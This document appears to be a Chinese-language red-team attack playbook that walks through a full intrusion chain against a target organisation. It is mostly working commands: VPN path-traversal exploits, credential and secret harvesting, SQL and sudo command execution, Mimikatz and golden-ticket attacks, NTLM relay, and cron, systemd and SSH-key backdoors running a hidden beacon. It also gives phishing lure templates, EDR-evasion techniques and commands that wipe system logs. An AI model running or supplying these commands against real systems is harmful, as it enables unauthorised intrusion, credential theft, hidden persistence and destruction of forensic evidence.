# Attack Chain Phases Reference

## 一、信息收集阶段（Reconnaissance）

### 1.1 企业数字资产测绘

```bash
# 子公司关联域名发现
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# 合并去重
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# 存活探测
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# 端口扫描（全端口）
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**实战要点**：
- 通过企查查/天眼查获取子公司列表，扩大攻击面
- 关注测试环境（test.、dev.、staging.）和新上线系统
- 证书透明度日志（crt.sh）发现隐藏域名

### 1.2 敏感信息泄露狩猎

```bash
# GitHub 搜索
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# JS 文件中的 API Key
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**高价值目标**：
- 云服务 AK/SK（阿里云、AWS、Azure）
- 数据库连接字符串
- JWT 密钥
- 内部 API 文档
- VPN/堡垒机凭据

### 1.3 员工信息画像

**社工字典生成规则**：
```
{姓名拼音}{年份}       → zhangsan2024
{姓名首字母}{部门缩写}  → zs_dev
{工号}@{域名}          → 10086@target.com
{姓名}{常见后缀}       → zhangsan@123, zhangsan!@#
```

**信息来源**：
- 脉脉/LinkedIn 部门架构
- 企业公众号/官网团队介绍
- 招聘信息（技术栈暴露）
- 学术论文（邮箱暴露）

### 1.4 技术栈指纹识别

```bash
# Web 指纹
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# 特定框架探测
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS 识别
wpscan --url https://target.com --enumerate p,t,u
```

---

## 二、边界突破阶段（Initial Access）

### 2.1 Web 漏洞利用（高频突破点）

| 漏洞类型 | 检测工具 | 利用方式 |
|---------|---------|---------|
| SQL 注入 | sqlmap | 数据提取 → 写 shell → OS 命令 |
| SSTI | sstimap | 模板注入 → RCE |
| 文件上传 | 手工 + Burp | Webshell → 反弹 shell |
| 反序列化 | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | 手工 | 内网探测 → 云元数据 → AK/SK |
| 未授权访问 | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | 管理员会话劫持 |

```bash
# SQL 注入自动化
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI 检测
sstimap -u "https://target.com/search?q=test"

# Nuclei 批量扫描
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 供应链攻击

**攻击路径**：
1. 识别目标使用的第三方组件/服务商
2. 攻击供应商获取代码签名/更新推送权限
3. 通过合法更新通道投递恶意载荷

**常见入口**：
- 开源组件投毒（npm/pip/maven）
- SaaS 服务商 API 滥用
- 外包人员权限利用
- 共享 IT 服务商横向渗透

### 2.3 钓鱼攻击

**邮件钓鱼**：
```
主题模板：
- [紧急] VPN 证书即将过期，请立即更新
- [IT通知] 邮箱存储空间不足，请清理
- [HR] 2024年度绩效考核结果查询
- [财务] 报销系统升级，请重新登录确认
```

**载荷类型**：
- Office 宏文档（.docm/.xlsm）
- LNK 快捷方式（伪装 PDF）
- HTML 走私（HTML Smuggling）
- ISO/IMG 镜像（绕过 MOTW）
- OneNote 嵌入脚本

**OAuth 钓鱼**（2025 新趋势）：
- 构造恶意 OAuth 应用请求权限
- 用户授权后获取邮箱/文件访问权限
- 无需密码，绕过 MFA

### 2.4 近源渗透（Physical Access）

| 手法 | 工具 | 效果 |
|------|------|------|
| BadUSB | Rubber Ducky / WiFi Ducky | 键盘注入 → 反弹 shell |
| 恶意充电宝 | O.MG Cable | 伪装数据线植入后门 |
| WiFi 钓鱼 | Fluxion / WiFi Pineapple | 伪造热点 → 凭据捕获 |
| RFID 克隆 | Proxmark3 | 门禁卡复制 → 物理进入 |
| 网络植入 | Raspberry Pi / LAN Turtle | 内网持久接入点 |

```bash
# Fluxion WiFi 钓鱼
fluxion  # 交互式选择目标 AP → 创建伪造热点 → 捕获 WPA 密码

# BadUSB 联动 Cobalt Strike
# 通过 USB 注入 PowerShell 下载器 → 上线 C2
```

### 2.5 VPN/远程接入突破

```bash
# Pulse Secure VPN（CVE-2019-11510）
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN（CVE-2018-13379）
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# 通用：密码喷洒
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 云服务突破

```bash
# AWS S3 桶枚举
aws s3 ls s3://target-bucket --no-sign-request

# 云元数据 SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD 密码喷洒
# 使用 MSOLSpray / Spray 工具
```

---

## 三、权限提升阶段（Privilege Escalation）

### 3.1 Windows 提权

| 技术 | 条件 | 工具 |
|------|------|------|
| Potato 系列 | SeImpersonate 权限 | SweetPotato / GodPotato / PrintSpoofer |
| 内核漏洞 | 未打补丁 | watson / wesng 检测 |
| 服务路径劫持 | 不带引号的服务路径 | PowerUp |
| DLL 劫持 | 可写 DLL 搜索路径 | Process Monitor |
| AlwaysInstallElevated | 注册表配置 | msiexec 安装恶意 MSI |
| 计划任务 | 可写任务脚本 | schtasks 替换 |

```powershell
# 检测 SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato 提权
.\GodPotato.exe -cmd "cmd /c whoami"

# 自动化检测
.\winPEAS.exe
```

### 3.2 Linux 提权

```bash
# SUID 检测
find / -perm -4000 -type f 2>/dev/null

# sudo 滥用
sudo -l
# 常见可利用：vim, find, python, nmap, less, awk, perl

# sudo vim 提权
sudo vim -c ':!/bin/bash'

# sudo find 提权
sudo find / -exec /bin/bash \;

# 内核漏洞
uname -r  # 检查版本
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# 自动化检测
./linpeas.sh
```

### 3.3 数据库提权

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF 提权
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 云权限提升

```bash
# AWS IAM 枚举
aws iam list-attached-user-policies --user-name compromised-user
# 寻找 iam:PassRole + lambda:CreateFunction → 管理员权限

# Azure AD
# 全局管理员 → 所有订阅控制
# 应用管理员 → 添加凭据到服务主体
```

---

## 四、横向移动阶段（Lateral Movement）

### 4.1 凭据获取

```bash
# Mimikatz（Windows）
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux 凭据
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM Hash 提取
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH 横向
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# 金票据
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 隐蔽横向技术

```bash
# WMI 无文件执行
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM 远程执行
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec（会留痕）
psexec.py domain/admin:password@target_ip

# SSH 隧道（Linux 环境）
ssh -D 1080 user@pivot_host  # SOCKS 代理
ssh -L 3389:internal_host:3389 user@pivot_host  # 端口转发
```

### 4.4 NTLM Relay

```bash
# 关闭 Responder 的 SMB/HTTP
# 编辑 Responder.conf: SMB = Off, HTTP = Off

# 启动 Responder 捕获
responder -I eth0

# NTLM Relay 到目标
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer 强制认证
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD 攻击路径

```bash
# BloodHound 数据收集
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# 常见攻击路径：
# 1. 用户 → GenericAll → 目标用户 → 重置密码
# 2. 用户 → WriteDacl → 目标 OU → 添加权限
# 3. 计算机 → 约束委派 → 模拟任意用户
# 4. 用户 → DCSync 权限 → 导出所有 Hash

# Certipy AD CS 攻击
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 五、权限维持阶段（Persistence）

### 5.1 Windows 持久化

| 技术 | 隐蔽性 | 检测难度 |
|------|:---:|:---:|
| 计划任务 | 中 | 低 |
| 注册表 Run 键 | 低 | 低 |
| WMI 事件订阅 | 高 | 高 |
| DLL 劫持 | 高 | 中 |
| 影子账户 | 中 | 中 |
| Golden Ticket | 极高 | 极高 |
| DSRM 后门 | 极高 | 极高 |

```powershell
# WMI 事件订阅（高隐蔽）
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 影子账户
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# 修改注册表 F 值克隆 RID
```

### 5.2 Linux 持久化

```bash
# SSH 密钥植入
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab 后门
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD 劫持
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM 后门
# 修改 pam_unix.so 添加万能密码

# Systemd 服务
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 云环境持久化

```bash
# AWS Lambda 后门
# 创建定时触发的 Lambda 函数，回连 C2

# Azure AD 应用注册
# 创建应用 → 添加密钥凭据 → 授予 Graph API 权限

# 容器后门
# 修改基础镜像 → 所有新容器自带后门
```

---

## 六、EDR/AV 绕过（Evasion）

### 6.1 核心绕过思路

| 层面 | 技术 | 说明 |
|------|------|------|
| 静态检测 | 加密/混淆/自定义加载器 | 避免签名匹配 |
| 行为检测 | 间接系统调用/Unhooking | 绕过 API Hook |
| 内存检测 | 模块踩踏/堆加密 | 避免内存扫描 |
| 网络检测 | 域前置/合法服务隧道 | 混入正常流量 |
| 日志检测 | ETW Patching/日志清除 | 减少痕迹 |

### 6.2 实用绕过技术

```
1. Shellcode 加载器自定义（不用公开工具）
2. 系统调用直接调用（绕过 ntdll hook）
3. 进程注入选择低监控进程（如 RuntimeBroker.exe）
4. C2 流量走 HTTPS + 域前置 / Cloudflare Workers
5. 内存中执行，不落盘（Fileless）
6. 利用合法签名程序加载（LOLBins）
```

### 6.3 C2 框架选择

| 框架 | 特点 | 适用场景 |
|------|------|---------|
| Cobalt Strike | 成熟稳定，团队协作 | 大型红队行动 |
| Sliver | 开源，Go 编写 | 预算有限 |
| Havoc | 现代化，模块化 | 需要定制 |
| Mythic | 多 agent 支持 | 跨平台 |
| AdaptixC2 | Kali 2026.1 收录 | 快速部署 |

---

## 七、痕迹清理（Anti-Forensics）

```bash
# Windows 日志清除
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux 日志清除
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# 时间戳修改
touch -t 202301010000 /path/to/file

# 内存清理
# 确保 Mimikatz dump 已删除
# 确保 C2 beacon 已退出
# 确保临时文件已清除
```

---

